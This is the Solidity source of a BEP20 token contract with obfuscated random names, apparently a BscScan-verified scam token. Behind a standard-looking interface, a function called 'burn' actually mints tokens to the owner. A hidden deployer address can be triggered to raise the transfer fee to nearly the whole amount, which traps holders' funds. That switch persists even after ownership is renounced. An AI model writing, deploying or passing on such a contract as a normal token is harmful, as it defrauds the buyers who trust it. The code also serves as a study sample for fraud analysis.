/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.8.15;
contract CSWAWS {
address public owner;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  UMMIME = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant KJDMWM = 73999;
uint8 public constant decimals = 18;
uint256 private  RVBEZZ = 10000000000000;
string public  symbol = "GROVXV";
string public  name = "YLZQDF";

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transferOwnership(address newOwner) public onlyOwner {
require(newOwner != address(0), "QDOBBR");
emit OwnershipTransferred(owner, newOwner);
owner = newOwner;
}
constructor () {
UMMIME = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KJDMWM/RVBEZZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UMMIME){
RVBEZZ = 73999+2;
}

emit Transfer(from, to, transferAmount);
}function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: transfer from the zero address");
        require(spender != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}